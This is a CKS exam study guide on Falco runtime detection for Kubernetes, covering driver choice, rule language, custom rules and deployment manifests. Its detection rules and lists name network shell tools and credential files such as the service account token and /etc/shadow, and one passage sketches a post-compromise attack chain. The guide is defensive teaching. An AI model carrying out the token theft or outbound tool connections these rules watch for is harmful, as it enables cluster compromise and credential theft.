# CKS 6.1 — Perform Behavioral Analytics to Detect Malicious Activities

**Domain:** Monitoring, Logging and Runtime Security (20%)
**Item weight:** ~4% of the exam
**Target Kubernetes version:** v1.34

---

## 1. The production problem: why static posture is not enough

Everything you hardened in domains 1–5 is a *pre-execution* control. RBAC decides who may create a Pod. Admission control decides which Pod spec is acceptable. Image signing decides which bits may be pulled. seccomp and AppArmor decide which syscalls the process is *allowed* to make.

None of them tell you what the process **actually did** after `containerd` handed control to the kernel.

The gap is structural, not a tooling deficiency:

| Control | Evaluated when | Blind to |
|---|---|---|
| RBAC | API request time | anything not going through kube-apiserver |
| ValidatingAdmissionPolicy / Pod Security Admission | object creation/update | runtime behaviour of an already-admitted Pod |
| Image scanning / signature verification | pull time | code downloaded *after* start (`curl \| sh`), interpreted payloads, LOLBins already in the image |
| NetworkPolicy | packet at the CNI datapath | in-container process activity, kernel-level abuse |
| seccomp / AppArmor | per-syscall, per-file | *allowed* syscalls used maliciously (`execve("/bin/sh")` is legal in 99% of profiles) |

A concrete production failure that motivates this entire domain:

> A Java service is compromised through a deserialization gadget. The attacker never creates a Pod, never touches the API server, never pulls a new image. They spawn `/bin/sh` from the JVM, read `/var/run/secrets/kubernetes.io/serviceaccount/token`, write a static binary to `/tmp`, `chmod +x` it, and execute it. Every single one of those operations is permitted by a default `RuntimeDefault` seccomp profile and by a permissive-egress NetworkPolicy.

The only observer that saw all of it was the **kernel**. Behavioral analytics is the discipline of instrumenting the kernel (and the API server, and the network datapath), building a model of "normal" for each workload, and alerting on deviation.

### 1.1 The three observation planes

You must be able to reason about which plane answers which question. Exam tasks and real incidents both hinge on picking the right one.

| Plane | Source of truth | Instrumentation | Answers |
|---|---|---|---|
| **Kernel / host** | syscalls, LSM hooks, tracepoints, kprobes | Falco, Tetragon, auditd, Sysdig, KubeArmor | *What did the process do?* exec, open, connect, setuid, mount, ptrace, module load |
| **Kubernetes API** | `kube-apiserver` audit backend | Audit Policy + audit log / webhook | *Who asked the control plane for what?* `exec` into Pod, secret read, RBAC escalation, Pod created with `hostPID` |
| **Network** | flow records, DNS, L7 | Cilium/Hubble, Calico flow logs, eBPF sockets, service mesh | *Who talked to whom?* C2 beacon, lateral movement, exfiltration volume |

A real detection almost always **correlates** planes. "A shell was spawned in `payments-api`" (kernel) is a low-confidence signal. "A shell was spawned in `payments-api` **and** 40 seconds earlier `kubectl exec` was recorded for user `dev-contractor` against that Pod" (API audit) is an incident with an owner. "A shell was spawned in `payments-api` **and** the container immediately opened a TCP connection to a non-RFC1918 address on 4444" (kernel + network) is a breach.

### 1.2 Signature detection vs. behavioral baselining

Two philosophies, and the exam expects the first while production needs both.

| | Rule/signature-based | Baseline/anomaly-based |
|---|---|---|
| **Model** | human-written boolean expression over event fields | learned profile of normal syscall/exec/network sets |
| **Examples** | Falco rules, auditd rules, Tetragon TracingPolicy | Security Profiles Operator recordings, Inspektor Gadget `advise`, commercial UEBA |
| **Latency to value** | immediate | needs a clean observation window (hours–days) |
| **False positives** | predictable, tunable per rule | high at first, decays as the baseline matures |
| **False negatives** | anything you did not anticipate | novel-but-in-profile behaviour |
| **Explainability** | perfect — the rule *is* the explanation | poor — "this differs from baseline" |
| **Drift handling** | rules rot silently | baseline must be re-recorded per release |
| **Exam relevance** | **high** — you will write Falco rules | low — but concepts are fair game |

The productive synthesis used in mature platforms: **record** behaviour to derive a baseline (SPO / Inspektor Gadget), **freeze** it into an enforcing control (seccomp/AppArmor profile), and **alert** with rules on the residual (Falco/Tetragon). Baselining reduces the attack surface; rules catch what remains.

---

## 2. Falco: architecture you must understand, not just configure

Falco is the CNCF graduated runtime security engine and is the tool the CKS exam environment ships. Understanding its internals is what separates "I copied a rule" from "I can debug why my rule did not fire".

### 2.1 Data path

```
┌────────────────────────────────────────────────────────────────────┐
│ user space                                                         │
│                                                                    │
│   ┌──────────┐   ┌──────────────┐   ┌───────────────┐             │
│   │ libscap  │──▶│   libsinsp   │──▶│  rule engine  │──▶ outputs  │
│   │ (capture)│   │ (state, enr.)│   │ (filter eval) │   stdout    │
│   └────▲─────┘   └──────▲───────┘   └───────────────┘   file      │
│        │                │                                gRPC      │
│        │ mmap'd ring    │ container metadata             http      │
│        │ buffers        │ (container plugin / CRI)       program   │
└────────┼────────────────┼──────────────────────────────────────────┘
         │                │
┌────────┼────────────────┼──────────────────────────────────────────┐
│ kernel │                │                                          │
│   ┌────┴──────────────┐ │   ┌──────────────────────┐              │
│   │ modern eBPF (CO-RE)│ │   │ kmod (falco.ko)      │  ← pick one  │
│   │ or legacy eBPF     │ │   │                      │              │
│   └────────▲───────────┘ │   └──────────▲───────────┘              │
│            │             │              │                          │
│      raw_syscalls:sys_enter / sys_exit tracepoints, sched_process_*│
└────────────────────────────────────────────────────────────────────┘
```

Key consequences of this design:

1. **Falco is not inline.** It observes from ring buffers *asynchronously*. It detects; it does not, by itself, block. (Falco Talon / response engines add reaction; Tetragon adds in-kernel enforcement.)
2. **Ring buffers can overflow.** Under syscall storms the kernel drops events. This is the #1 silent failure in production — covered in §7.3.
3. **Container enrichment is a user-space lookup** against the CRI socket. If the socket is not mounted, `%container.name` degrades and `k8s.*` fields go empty — the #2 silent failure.
4. **Falco only traces the syscalls its loaded rules need.** Enabling a rule that references an untraced syscall without adjusting `base_syscalls` yields zero events with no error.

### 2.2 Driver selection — the first architectural decision

| Driver (`engine.kind`) | Kernel requirement | Artifact per kernel? | Kernel taint / panic risk | Overhead | When to choose |
|---|---|---|---|---|---|
| `modern_ebpf` | ≥ 5.8 (BPF ring buffer), BTF available | **No** — CO-RE, embedded in the Falco binary | none (verifier-checked) | lowest | **Default for any modern distro.** RHEL 9, Ubuntu 22.04+, Talos, Bottlerocket |
| `ebpf` (legacy probe) | ≥ 4.14 | yes — `falco-bpf.o` built or downloaded per kernel | none | low | older kernels without BTF; being phased out |
| `kmod` | any with headers | yes — `falco.ko` built or downloaded per kernel | **taints kernel; a bug can panic the node** | low | air-gapped legacy fleets, kernels < 4.14 |
| `gvisor` | n/a — reads `runsc` trace sinks | no | none | moderate | sandboxed workloads on GKE Sandbox / runsc |
| `replay` | n/a | no | none | n/a | offline analysis of a `.scap` capture — great for post-incident and for testing rules |

**BTF is the gate for `modern_ebpf`.** Verify before you commit to it:

```console
$ ls -l /sys/kernel/btf/vmlinux
-r--r--r--. 1 root root 5918471 Aug  5 09:12 /sys/kernel/btf/vmlinux

$ uname -r
5.15.0-118-generic
```

If `/sys/kernel/btf/vmlinux` is absent, the node was built without `CONFIG_DEBUG_INFO_BTF=y` and you fall back to `ebpf` or `kmod`.

### 2.3 Rule language anatomy

A Falco ruleset file contains four object kinds. Order does not matter; names must be unique per kind.

```yaml
# ── required: declares which rules-file schema this file targets ──
- required_engine_version: 0.41.0

# ── LIST: a named set of literal values, expanded inline ──
- list: shell_binaries
  items: [ash, bash, csh, dash, fish, ksh, sh, tcsh, zsh]

# ── MACRO: a named, reusable boolean sub-expression ──
- macro: spawned_process
  condition: evt.type in (execve, execveat) and evt.dir = <

- macro: container
  condition: container.id != host

# ── RULE: condition + output + priority ──
- rule: Terminal shell in container
  desc: >
    An interactive shell was spawned inside a container with an attached TTY.
    Legitimate workloads do not do this; it is the signature of kubectl exec,
    an exploited RCE, or a debug sidecar left in production.
  condition: >
    spawned_process
    and container
    and proc.name in (shell_binaries)
    and proc.tty != 0
  output: >
    Shell spawned in container
    (evt_time=%evt.time user=%user.name uid=%user.uid
     proc=%proc.name cmdline=%proc.cmdline parent=%proc.pname
     container_id=%container.id image=%container.image.repository
     ns=%k8s.ns.name pod=%k8s.pod.name)
  priority: WARNING
  tags: [container, shell, mitre_execution, T1059]
  source: syscall
```

#### Field reference you will actually use

| Field | Meaning | Note |
|---|---|---|
| `evt.time` | human-readable timestamp | `evt.time.iso8601` for RFC3339, `evt.time.s` for epoch seconds |
| `evt.type` | syscall name (`execve`, `open`, `openat`, `connect`, `setuid`) | |
| `evt.dir` | `>` enter, `<` exit | **exec rules must use `<`**, otherwise `proc.name` is still the *parent* |
| `evt.arg.*` / `evt.args` | syscall arguments | e.g. `evt.arg.flags contains O_WRONLY` |
| `proc.name` | executable basename | |
| `proc.exepath` | absolute resolved path | stronger than `proc.name` against renaming |
| `proc.cmdline` | full command line | |
| `proc.pname` / `proc.aname[N]` | parent / N-th ancestor name | `proc.aname[2]` = grandparent |
| `proc.tty` | controlling TTY, `0` = none | the interactive-shell discriminator |
| `proc.pid`, `proc.ppid` | pids | |
| `user.name`, `user.uid`, `user.loginuid` | identity | `loginuid` survives `su`/`sudo` on hosts |
| `group.gid` | primary gid | |
| `fd.name` | file/socket name | `fd.sip`, `fd.sport`, `fd.rip`, `fd.rport` for sockets |
| `fd.directory`, `fd.filename` | split path | |
| `container.id` | short container id, or literal `host` | |
| `container.name` | container name | |
| `container.image.repository` | image without tag | `container.image.tag`, `container.image.digest` |
| `container.privileged` | boolean | |
| `k8s.ns.name`, `k8s.pod.name` | from CRI labels | available **without** the k8smeta plugin |
| `k8s.pod.label[app]`, `k8s.deployment.name` | **requires `k8smeta` plugin + k8s-metacollector** | common exam trap |

#### Operators

`=` `!=` `<` `<=` `>` `>=` `contains` `icontains` `bcontains` `startswith` `endswith` `glob` `in (…)` `intersects (…)` `pmatch (…)` `exists` — combined with `and` `or` `not` and parentheses.

`pmatch` is a prefix-tree path match and is dramatically faster than a list of `startswith`:

```yaml
condition: fd.name pmatch (/etc, /usr/bin, /usr/sbin)
```

#### Priorities (ordered, highest first)

`EMERGENCY` > `ALERT` > `CRITICAL` > `ERROR` > `WARNING` > `NOTICE` > `INFORMATIONAL` > `DEBUG`

`falco.yaml`'s top-level `priority:` key sets the **minimum** severity that is loaded and evaluated. A rule at `DEBUG` in a cluster configured with `priority: informational` never fires — and Falco says nothing. This is failure mode #3.

### 2.4 Rule overriding (Falco ≥ 0.38)

The legacy `append: true` is deprecated. The modern form is explicit and much safer, because it names *which* attribute is being appended vs. replaced.

```yaml
# Append an exclusion to an upstream rule without forking it
- rule: Terminal shell in container
  condition: and not k8s.ns.name in (debug-tools, ci-runners)
  override:
    condition: append

# Replace the output of an upstream rule entirely
- rule: Terminal shell in container
  output: "TTY shell %k8s.ns.name/%k8s.pod.name user=%user.name cmd=%proc.cmdline"
  priority: CRITICAL
  override:
    output: replace
    priority: replace

# Disable an upstream rule
- rule: Read sensitive file untrusted
  enabled: false
```

Same mechanism works for macros and lists:

```yaml
- list: shell_binaries
  items: [busybox, nc, ncat]
  override:
    items: append
```

**Load order matters.** Overrides must be loaded *after* the rule they modify — put them in `falco_rules.local.yaml` or a `rules.d/` file that sorts later, and confirm the `rules_files` order in `falco.yaml`.

---

## 3. Complete production deployment

### 3.1 Namespace, RBAC and service account

```yaml
---
apiVersion: v1
kind: Namespace
metadata:
  name: falco
  labels:
    pod-security.kubernetes.io/enforce: privileged
    pod-security.kubernetes.io/audit: privileged
    pod-security.kubernetes.io/warn: privileged
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: falco
  namespace: falco
  labels:
    app.kubernetes.io/name: falco
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: falco
  labels:
    app.kubernetes.io/name: falco
rules:
  # Required only by the k8smeta plugin / k8s-metacollector for owner-reference
  # enrichment (deployment name, pod labels). Omit if you do not deploy it.
  - apiGroups: [""]
    resources: ["pods", "namespaces", "replicationcontrollers", "services", "nodes"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["apps"]
    resources: ["daemonsets", "deployments", "replicasets", "statefulsets"]
    verbs: ["get", "list", "watch"]
  - apiGroups: ["batch"]
    resources: ["jobs", "cronjobs"]
    verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: falco
  labels:
    app.kubernetes.io/name: falco
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: falco
subjects:
  - kind: ServiceAccount
    name: falco
    namespace: falco
```

### 3.2 `falco.yaml` — the engine configuration

```yaml
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-config
  namespace: falco
  labels:
    app.kubernetes.io/name: falco
data:
  falco.yaml: |
    ############################
    # Rules files, in load order
    ############################
    rules_files:
      - /etc/falco/falco_rules.yaml           # upstream stable ruleset
      - /etc/falco/falco_rules.local.yaml     # local overrides / additions
      - /etc/falco/rules.d                    # directory, loaded lexicographically

    ############################
    # Driver
    ############################
    engine:
      kind: modern_ebpf
      kmod:
        buf_size_preset: 4
        drop_failed_exit: false
      ebpf:
        probe: ${HOME}/.falco/falco-bpf.o
        buf_size_preset: 4
        drop_failed_exit: false
      modern_ebpf:
        cpus_for_each_buffer: 2
        buf_size_preset: 4
        drop_failed_exit: false
      replay:
        capture_file: ""
      gvisor:
        config: ""
        root: ""

    ############################
    # Container metadata.
    # Falco >= 0.41 sources this from the `container` plugin. On <= 0.40 the
    # equivalent block is the top-level `container_engine:` key.
    ############################
    plugins:
      - name: container
        library_path: libcontainer.so
        init_config:
          label_max_len: 100
          with_size: false
          hooks: [1]
          engines:
            docker:   { enabled: true, sockets: ["/var/run/docker.sock"] }
            podman:   { enabled: true, sockets: ["/run/podman/podman.sock"] }
            containerd: { enabled: true, sockets: ["/run/containerd/containerd.sock"] }
            cri:      { enabled: true, sockets: ["/run/crio/crio.sock"] }
            lxc:      { enabled: false }
            libvirt_lxc: { enabled: false }
            bpm:      { enabled: false }
    load_plugins: [container]

    ############################
    # Minimum severity actually evaluated. Rules below this are NOT loaded.
    ############################
    priority: debug

    ############################
    # Output channels
    ############################
    json_output: true
    json_include_output_property: true
    json_include_tags_property: true
    json_include_message_property: false
    buffered_outputs: false          # false => flush per event; needed for exam-style file capture

    stdout_output:
      enabled: true

    file_output:
      enabled: true
      keep_alive: false
      filename: /var/log/falco/events.log

    syslog_output:
      enabled: false

    http_output:
      enabled: true
      url: "http://falcosidekick.falco.svc.cluster.local:2801/"
      user_agent: "falcosecurity/falco"
      insecure: false
      echo: false

    program_output:
      enabled: false
      keep_alive: false
      program: "jq '{text: .output}' | curl -d @- -X POST https://hooks.example/…"

    grpc:
      enabled: false
      bind_address: "unix:///run/falco/falco.sock"
      threadiness: 0
    grpc_output:
      enabled: false

    ############################
    # Health / metrics
    ############################
    webserver:
      enabled: true
      listen_port: 8765
      k8s_healthz_endpoint: /healthz
      prometheus_metrics_enabled: true
      threadiness: 0
      ssl_enabled: false

    metrics:
      enabled: true
      interval: 15m
      output_rule: true
      rules_counters_enabled: true
      resource_utilization_enabled: true
      state_counters_enabled: true
      kernel_event_counters_enabled: true
      libbpf_stats_enabled: true
      convert_memory_to_mb: true
      include_empty_values: false

    ############################
    # Drop / overload behaviour  ← read §7.3 before changing
    ############################
    syscall_event_drops:
      threshold: 0.1
      actions: [log, alert]
      rate: 0.03333
      max_burst: 1
      simulate_drops: false

    syscall_event_timeouts:
      max_consecutives: 1000

    ############################
    # Operational
    ############################
    watch_config_files: true         # hot-reload on rules/config change
    time_format_iso_8601: true
    log_stderr: true
    log_syslog: false
    log_level: info
    libs_logger:
      enabled: false
      severity: debug
    output_timeout: 2000
    outputs_queue:
      capacity: 0

    ############################
    # Syscall selection.
    # `repair: true` makes Falco compute the minimal set required by the loaded
    # rules and add the state-tracking syscalls libsinsp needs. Prefer this over
    # a hand-written custom_set.
    ############################
    base_syscalls:
      custom_set: []
      repair: true
```

### 3.3 Custom rules ConfigMap

```yaml
---
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-rules-custom
  namespace: falco
  labels:
    app.kubernetes.io/name: falco
data:
  90-custom-rules.yaml: |
    - required_engine_version: 0.41.0

    ####################################################################
    # Lists
    ####################################################################
    - list: known_shell_binaries
      items: [ash, bash, csh, dash, fish, ksh, sh, tcsh, zsh, busybox]

    - list: package_mgmt_binaries
      items: [apt, apt-get, dpkg, yum, dnf, rpm, apk, microdnf, pip, pip3, npm, gem]

    - list: network_recon_binaries
      items: [nc, ncat, netcat, nmap, socat, dig, nslookup, host, tcpdump, curl, wget]

    - list: sensitive_credential_paths
      items:
        - /var/run/secrets/kubernetes.io/serviceaccount
        - /etc/shadow
        - /etc/kubernetes/pki
        - /root/.kube/config
        - /root/.ssh
        - /var/lib/kubelet/pki

    - list: trusted_debug_namespaces
      items: [falco, kube-system, sre-breakglass]

    ####################################################################
    # Macros
    ####################################################################
    - macro: spawned_process
      condition: evt.type in (execve, execveat) and evt.dir = <

    - macro: in_container
      condition: container.id != host

    - macro: open_write
      condition: >
        evt.type in (open, openat, openat2)
        and evt.is_open_write = true
        and fd.typechar = f
        and fd.num >= 0

    - macro: open_read
      condition: >
        evt.type in (open, openat, openat2)
        and evt.is_open_read = true
        and fd.typechar = f
        and fd.num >= 0

    - macro: outbound_connection
      condition: >
        evt.type = connect
        and evt.dir = <
        and fd.l4proto = tcp
        and fd.sockfamily = ip

    - macro: private_destination
      condition: >
        fd.rnet in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8")

    ####################################################################
    # Rules
    ####################################################################

    # ---- T1059 Command and Scripting Interpreter -------------------
    - rule: Interactive shell spawned in container
      desc: >
        A shell with a controlling TTY was executed inside a container. This is
        the runtime signature of `kubectl exec -it`, of an exploited RCE that
        upgraded to a PTY, or of a forgotten debug sidecar.
      condition: >
        spawned_process
        and in_container
        and proc.name in (known_shell_binaries)
        and proc.tty != 0
        and not k8s.ns.name in (trusted_debug_namespaces)
      output: >
        Interactive shell in container
        (time=%evt.time.iso8601 user=%user.name uid=%user.uid
         shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline
         tty=%proc.tty container=%container.name image=%container.image.repository
         ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: WARNING
      tags: [container, shell, mitre_execution, T1059]
      source: syscall

    # ---- T1552.001 Credentials In Files ----------------------------
    - rule: Service account token read by unexpected process
      desc: >
        A process other than the language runtime or an in-cluster client read
        the projected service account token. Post-exploitation reconnaissance
        almost always starts here.
      condition: >
        open_read
        and in_container
        and fd.name pmatch (/var/run/secrets/kubernetes.io/serviceaccount)
        and proc.name in (known_shell_binaries, network_recon_binaries, cat, head, tail, base64, xxd, od, strings)
      output: >
        ServiceAccount token accessed by suspicious process
        (time=%evt.time.iso8601 user=%user.name uid=%user.uid
         proc=%proc.name cmdline=%proc.cmdline file=%fd.name
         container=%container.name image=%container.image.repository
         ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: CRITICAL
      tags: [container, secrets, mitre_credential_access, T1552.001]
      source: syscall

    # ---- Container drift: new executable written then executed -----
    - rule: New executable written to container filesystem
      desc: >
        A file was created or truncated for writing under a directory that is
        normally read-only in an immutable container. Combined with the drift
        exec rule below this detects "download and run" payloads.
      condition: >
        open_write
        and in_container
        and fd.name pmatch (/bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /tmp, /dev/shm, /var/tmp)
        and not proc.name in (package_mgmt_binaries)
      output: >
        Executable path written inside container
        (time=%evt.time.iso8601 user=%user.name uid=%user.uid
         proc=%proc.name cmdline=%proc.cmdline file=%fd.name
         container=%container.name image=%container.image.repository
         ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: NOTICE
      tags: [container, drift, mitre_persistence, T1105]
      source: syscall

    - rule: Drifted binary executed in container
      desc: >
        A process executed a binary that was not present in the container image
        (upper layer of the overlayfs). This is the highest-signal container
        drift detection available from syscalls alone.
      condition: >
        spawned_process
        and in_container
        and proc.is_exe_upper_layer = true
      output: >
        Binary not in container image was executed (container drift)
        (time=%evt.time.iso8601 user=%user.name uid=%user.uid
         exe=%proc.exepath cmdline=%proc.cmdline parent=%proc.pname
         container=%container.name image=%container.image.repository
         ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: CRITICAL
      tags: [container, drift, mitre_execution, T1204]
      source: syscall

    # ---- T1611 Escape to Host --------------------------------------
    - rule: Container escape primitive observed
      desc: >
        A container invoked a syscall that is only useful for breaking the
        namespace boundary: mount, setns, unshare, kernel module load, or a
        write to a well-known cgroup escape path.
      condition: >
        in_container
        and (
          (spawned_process and proc.name in (nsenter, unshare, mount, umount, insmod, modprobe, rmmod))
          or (evt.type in (mount, umount2, setns, unshare, init_module, finit_module) and evt.dir = <)
          or (open_write and fd.name pmatch (/sys/fs/cgroup, /proc/sys/kernel/core_pattern, /sys/kernel/uevent_helper))
        )
      output: >
        Possible container escape attempt
        (time=%evt.time.iso8601 user=%user.name uid=%user.uid
         evt=%evt.type proc=%proc.name cmdline=%proc.cmdline file=%fd.name
         privileged=%container.privileged container=%container.name
         image=%container.image.repository ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: CRITICAL
      tags: [container, escape, mitre_privilege_escalation, T1611]
      source: syscall

    # ---- T1071 C2 beacon -------------------------------------------
    - rule: Outbound connection to public IP from recon tool
      desc: >
        A network utility inside a container opened a TCP connection to a
        non-private address. Legitimate application traffic uses the language
        runtime's own socket code, not curl/nc.
      condition: >
        outbound_connection
        and in_container
        and not private_destination
        and proc.name in (network_recon_binaries)
      output: >
        Recon/transfer tool connected to public address
        (time=%evt.time.iso8601 user=%user.name uid=%user.uid
         proc=%proc.name cmdline=%proc.cmdline
         dest=%fd.rip:%fd.rport conn=%fd.name
         container=%container.name image=%container.image.repository
         ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: WARNING
      tags: [container, network, mitre_command_and_control, T1071]
      source: syscall

    # ---- T1548 setuid abuse ----------------------------------------
    - rule: Privilege escalation to root inside container
      desc: >
        A non-root process transitioned to uid 0 inside a container. With
        allowPrivilegeEscalation=false and NoNewPrivs this should be impossible.
      condition: >
        evt.type in (setuid, setresuid) and evt.dir = <
        and in_container
        and evt.arg.uid = 0
        and user.uid != 0
      output: >
        Process escalated to root inside container
        (time=%evt.time.iso8601 from_uid=%user.uid from_user=%user.name
         proc=%proc.name cmdline=%proc.cmdline parent=%proc.pname
         container=%container.name image=%container.image.repository
         ns=%k8s.ns.name pod=%k8s.pod.name)
      priority: CRITICAL
      tags: [container, privesc, mitre_privilege_escalation, T1548]
      source: syscall

    ####################################################################
    # Overrides of upstream rules (must load AFTER falco_rules.yaml)
    ####################################################################
    - rule: Read sensitive file untrusted
      condition: and not proc.name in (node_exporter, kubelet, fluent-bit)
      override:
        condition: append
```

### 3.4 The DaemonSet

```yaml
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: falco
  namespace: falco
  labels:
    app.kubernetes.io/name: falco
    app.kubernetes.io/component: runtime-security
spec:
  selector:
    matchLabels:
      app.kubernetes.io/name: falco
  updateStrategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1
  template:
    metadata:
      labels:
        app.kubernetes.io/name: falco
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "8765"
        prometheus.io/path: "/metrics"
    spec:
      serviceAccountName: falco
      priorityClassName: system-node-critical
      hostNetwork: true
      hostPID: true
      dnsPolicy: ClusterFirstWithHostNet
      terminationGracePeriodSeconds: 30
      tolerations:
        - operator: Exists
      containers:
        - name: falco
          image: docker.io/falcosecurity/falco-no-driver:0.41.0
          imagePullPolicy: IfNotPresent
          args:
            - /usr/bin/falco
            - -pk                     # append k8s.* fields to output
          securityContext:
            privileged: false
            runAsUser: 0
            readOnlyRootFilesystem: false
            allowPrivilegeEscalation: true
            capabilities:
              # Least-privilege set for the modern_ebpf driver.
              # For `kmod` you need privileged: true instead.
              drop: ["ALL"]
              add:
                - SYS_ADMIN          # required by the container plugin for /proc introspection
                - SYS_RESOURCE       # raise RLIMIT_MEMLOCK for BPF maps
                - SYS_PTRACE         # read /proc/<pid> of other namespaces
                - BPF                # bpf() syscall
                - PERFMON            # attach to tracepoints
          env:
            - name: HOST_ROOT
              value: /host
            - name: FALCO_HOSTNAME
              valueFrom:
                fieldRef:
                  fieldPath: spec.nodeName
            - name: FALCO_K8S_NODE_NAME
              valueFrom:
                fieldRef:
                  fieldPath: spec.nodeName
          resources:
            requests:
              cpu: 100m
              memory: 512Mi
            limits:
              cpu: "1"
              memory: 1Gi
          livenessProbe:
            httpGet:
              path: /healthz
              port: 8765
            initialDelaySeconds: 60
            periodSeconds: 15
            timeoutSeconds: 5
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /healthz
              port: 8765
            initialDelaySeconds: 30
            periodSeconds: 15
            timeoutSeconds: 5
            failureThreshold: 3
          volumeMounts:
            - name: config
              mountPath: /etc/falco/falco.yaml
              subPath: falco.yaml
              readOnly: true
            - name: rules-custom
              mountPath: /etc/falco/rules.d
              readOnly: true
            - name: proc-fs
              mountPath: /host/proc
              readOnly: true
            - name: etc-fs
              mountPath: /host/etc
              readOnly: true
            - name: boot-fs
              mountPath: /host/boot
              readOnly: true
            - name: lib-modules
              mountPath: /host/lib/modules
              readOnly: true
            - name: sys-fs
              mountPath: /sys/kernel/debug
            - name: containerd-socket
              mountPath: /run/containerd/containerd.sock
              readOnly: true
            - name: crio-socket
              mountPath: /run/crio/crio.sock
              readOnly: true
            - name: docker-socket
              mountPath: /var/run/docker.sock
              readOnly: true
            - name: falco-logs
              mountPath: /var/log/falco
      volumes:
        - name: config
          configMap:
            name: falco-config
            items:
              - key: falco.yaml
                path: falco.yaml
        - name: rules-custom
          configMap:
            name: falco-rules-custom
        - name: proc-fs
          hostPath:
            path: /proc
        - name: etc-fs
          hostPath:
            path: /etc
        - name: boot-fs
          hostPath:
            path: /boot
        - name: lib-modules
          hostPath:
            path: /lib/modules
        - name: sys-fs
          hostPath:
            path: /sys/kernel/debug
        - name: containerd-socket
          hostPath:
            path: /run/containerd/containerd.sock
            type: SocketOrCreate
        - name: crio-socket
          hostPath:
            path: /run/crio/crio.sock
            type: SocketOrCreate
        - name: docker-socket
          hostPath:
            path: /var/run/docker.sock
            type: SocketOrCreate
        - name: falco-logs
          hostPath:
            path: /var/log/falco
            type: DirectoryOrCreate
```

> **`kmod` variant.** If BTF is unavailable, switch `engine.kind` to `kmod`, set `securityContext.privileged: true` (dropping the capability list), and prepend this initContainer:
>
> ```yaml
>       initContainers:
>         - name: falco-driver-loader
>           image: docker.io/falcosecurity/falco-driver-loader:0.41.0
>           imagePullPolicy: IfNotPresent
>           args: ["falcoctl", "driver", "install"]
>           securityContext:
>             privileged: true
>           env:
>             - name: HOST_ROOT
>               value: /host
>             - name: FALCOCTL_DRIVER_KIND
>               value: kmod
>           volumeMounts:
>             - name: lib-modules
>               mountPath: /host/lib/modules
>             - name: boot-fs
>               mountPath: /host/boot
>               readOnly: true
>             - name: etc-fs
>               mountPath: /host/etc
>               readOnly: true
>             - name: usr-fs
>               mountPath: /host/usr
>               readOnly: true
>             - name: driver-dir
>               mountPath: /root/.falco
> ```

### 3.5 Falcosidekick: routing alerts by priority

Falco's own outputs are dumb pipes. Falcosidekick is the fan-out layer that turns priorities into routing decisions.

```yaml
---
apiVersion: v1
kind: Secret
metadata:
  name: falcosidekick-secrets
  namespace: falco
type: Opaque
stringData:
  SLACK_WEBHOOKURL: "https://hooks.slack.com/services/REPLACE/ME"
  ALERTMANAGER_HOSTPORT: "http://alertmanager-operated.monitoring.svc:9093"
  LOKI_HOSTPORT: "http://loki-gateway.monitoring.svc"
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: falcosidekick
  namespace: falco
  labels:
    app.kubernetes.io/name: falcosidekick
spec:
  replicas: 2
  selector:
    matchLabels:
      app.kubernetes.io/name: falcosidekick
  template:
    metadata:
      labels:
        app.kubernetes.io/name: falcosidekick
      annotations:
        prometheus.io/scrape: "true"
        prometheus.io/port: "2801"
        prometheus.io/path: "/metrics"
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1234
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: falcosidekick
          image: docker.io/falcosecurity/falcosidekick:2.31.1
          imagePullPolicy: IfNotPresent
          ports:
            - name: http
              containerPort: 2801
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop: ["ALL"]
          env:
            - name: DEBUG
              value: "false"
            # ── Slack: only CRITICAL and above reaches humans on call ──
            - name: SLACK_MINIMUMPRIORITY
              value: "critical"
            - name: SLACK_WEBHOOKURL
              valueFrom:
                secretKeyRef:
                  name: falcosidekick-secrets
                  key: SLACK_WEBHOOKURL
            # ── Alertmanager: warning and above becomes a paging signal ──
            - name: ALERTMANAGER_MINIMUMPRIORITY
              value: "warning"
            - name: ALERTMANAGER_HOSTPORT
              valueFrom:
                secretKeyRef:
                  name: falcosidekick-secrets
                  key: ALERTMANAGER_HOSTPORT
            # ── Loki: everything, for forensics and baselining ──
            - name: LOKI_MINIMUMPRIORITY
              value: "debug"
            - name: LOKI_HOSTPORT
              valueFrom:
                secretKeyRef:
                  name: falcosidekick-secrets
                  key: LOKI_HOSTPORT
          resources:
            requests: { cpu: 50m, memory: 64Mi }
            limits:   { cpu: 500m, memory: 256Mi }
          livenessProbe:
            httpGet: { path: /ping, port: 2801 }
            initialDelaySeconds: 10
            periodSeconds: 10
          readinessProbe:
            httpGet: { path: /ping, port: 2801 }
            initialDelaySeconds: 5
            periodSeconds: 10
---
apiVersion: v1
kind: Service
metadata:
  name: falcosidekick
  namespace: falco
  labels:
    app.kubernetes.io/name: falcosidekick
spec:
  type: ClusterIP
  selector:
    app.kubernetes.io/name: falcosidekick
  ports:
    - name: http
      port: 2801
      targetPort: 2801
      protocol: TCP
```

Priority-to-destination routing is the operational heart of behavioral analytics. Without it, a `NOTICE`-level drift rule pages someone at 03:00 and the whole system gets muted within a week.

| Priority | Destination | Expected volume/day/1000 nodes | Human action |
|---|---|---|---|
| `EMERGENCY`–`CRITICAL` | PagerDuty + Slack + SIEM | < 5 | wake someone |
